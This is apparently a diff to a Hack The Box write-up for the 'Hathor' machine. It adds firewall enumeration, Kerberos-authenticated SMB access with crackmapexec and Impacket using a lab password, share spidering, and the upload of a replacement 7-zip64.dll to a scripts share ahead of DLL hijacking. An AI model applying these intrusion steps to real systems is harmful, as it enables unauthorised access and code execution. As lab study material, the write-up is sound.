@@ -35,6 +35,13 @@ I’ll try a more full-featured webshell, like Insomnia. It has a built in rever
 * https://github.com/A1vinSmith/Get-bADpasswords
 
 ```cmd powershell
+# Firewale enums:
+Get-NetFirewallRule -PolicyStore ActiveStore
+Get-NetFirewallRule -PolicyStore ActiveStore | where { $_.Action -eq "Block" }
+Get-NetFirewallRule -PolicyStore ActiveStore | where { $_.Action -eq "Block" } | Select DisplayName
+Get-NetFirewallRule -PolicyStore ActiveStore -Name "{ID}"
+Get-NetFirewallRule -PolicyStore ActiveStore -Name "{ID}" | Get-NetFirewallApplicationFilter
+
 c:\Get-bADpasswords\Accessible\CSVs>type exported_windcorp-18032022-044046.csv
 type exported_windcorp-18032022-044046.csv
 Activity;Password Type;Account Type;Account Name;Account SID;Account password hash;Present in password list(s)
@@ -141,7 +148,7 @@ One thing need to be remind, TO turn it on&off the switch
 ```conf
 # HTB box
 # nameserver 10.129.47.158 	<- for using kinit to get a ticket by putting victim's address
-nameserver 10.10.16.2 		<- for running the smbclient. it's need by using Wireshark to investigate	
+nameserver 10.10.16.2 		<- for running the smbclient. it's need by using Wireshark to investigate. Also turn above off to make it work	
 ```
 
 ##### Alternatively using Impacket
@@ -151,6 +158,8 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 
 [*] Saving ticket in beatricemill.ccache
 ```
+
+But I couldn't make it work.
 
 ##### Looking in to the share
 ```bash
@@ -184,6 +193,14 @@ smb: \scripts\> dir
   _MiscExamples.au3                   A      498  Fri Nov 28 05:04:30 2008
 
                 10328063 blocks of size 4096. 2270930 blocks available
+
+smb: \scripts\> put 7-zip64.dll 
+putting file 7-zip64.dll as \scripts\7-zip64.dll (462.6 kb/s) (average 573.0 kb/s)
+
+type 7Zip.au3
+#VARIABLES# ===================================================================================================================
+Global $sZip32Dll = "7-zip32.dll"                       ;|If you intend to modify the original name of used dll, don't forget
+Global $sZip64Dll = "7-zip64.dll"                       ;|to modify _7ZipStartup() function in FileInstall section.
 ```
 
 Inside the share there are two executables and one directory called scripts. Judging from the names of
@@ -201,3 +218,53 @@ be the AutoIT scripting framework.
 ```
 
 As we can see from the above `applocker.xml`, they're matched and allowed.
+
+##### One interesting that aovid using alias
+```bash
+crackmapexec smb hathor.windcorp.htb -k -d windcorp.htb -u beatricemill -p '!!!!ilovegood17' --shares
+SMB         hathor.windcorp.htb 445    hathor.windcorp.htb [*]  x64 (name:hathor.windcorp.htb) (domain:windcorp.htb) (signing:True) (SMBv1:False)
+SMB         hathor.windcorp.htb 445    hathor.windcorp.htb [+] windcorp.htb\beatricemill:!!!!ilovegood17 
+SMB         hathor.windcorp.htb 445    hathor.windcorp.htb [+] Enumerated shares
+SMB         hathor.windcorp.htb 445    hathor.windcorp.htb Share           Permissions     Remark
+SMB         hathor.windcorp.htb 445    hathor.windcorp.htb -----           -----------     ------
+SMB         hathor.windcorp.htb 445    hathor.windcorp.htb ADMIN$                          Remote Admin
+SMB         hathor.windcorp.htb 445    hathor.windcorp.htb C$                              Default share
+SMB         hathor.windcorp.htb 445    hathor.windcorp.htb IPC$            READ            Remote IPC
+SMB         hathor.windcorp.htb 445    hathor.windcorp.htb NETLOGON        READ            Logon server share 
+SMB         hathor.windcorp.htb 445    hathor.windcorp.htb share           READ,WRITE      
+SMB         hathor.windcorp.htb 445    hathor.windcorp.htb SYSVOL          READ            Logon server share 
+cme smb hathor.windcorp.htb -k -d windcorp.htb -u beatrucemill -p '!!!!ilovegood17' --shares
+SMB         hathor.windcorp.htb 445    hathor.windcorp.htb [*]  x64 (name:hathor.windcorp.htb) (domain:windcorp.htb) (signing:True) (SMBv1:False)
+SMB         hathor.windcorp.htb 445    hathor.windcorp.htb [-] windcorp.htb\beatrucemill: KDC_ERR_C_PRINCIPAL_UNKNOWN
+
+sudo python /usr/share/doc/python3-impacket/examples/smbclient.py -k 'windcorp.htb/beatricemill:!!!!ilovegood17@hathor.windcorp.htb'
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Type help for list of commands
+# shares
+ADMIN$
+C$
+IPC$
+NETLOGON
+share
+SYSVOL
+```
+
+### Shell as GinaWild
+##### Enumerate share Share
+Using the CME with the `spider_plus` module to dump all file names, then using JQ to parse the results with `map_values(keys)`
+
+```bash
+time crackmapexec smb hathor.windcorp.htb -k -d windcorp.htb -u beatricemill -p '!!!!ilovegood17' --shares -M spider_plus
+SMB         hathor.windcorp.htb 445    hathor.windcorp.htb [*]  x64 (name:hathor.windcorp.htb) (domain:windcorp.htb) (signing:True) (SMBv1:False)
+SMB         hathor.windcorp.htb 445    hathor.windcorp.htb [+] windcorp.htb\beatricemill:!!!!ilovegood17 
+SPIDER_P... hathor.windcorp.htb 445    hathor.windcorp.htb [*] Started spidering plus with option:
+SPIDER_P... hathor.windcorp.htb 445    hathor.windcorp.htb [*]        DIR: ['print$']
+SPIDER_P... hathor.windcorp.htb 445    hathor.windcorp.htb [*]        EXT: ['ico', 'lnk']
+SPIDER_P... hathor.windcorp.htb 445    hathor.windcorp.htb [*]       SIZE: 51200
+SPIDER_P... hathor.windcorp.htb 445    hathor.windcorp.htb [*]     OUTPUT: /tmp/cme_spider_plus
+
+cat /tmp/cme_spider_plus/hathor.windcorp.htb.json | jq '. | map_values(keys)'
+```
+
+##### Find Running Processes & Dll Hijacking
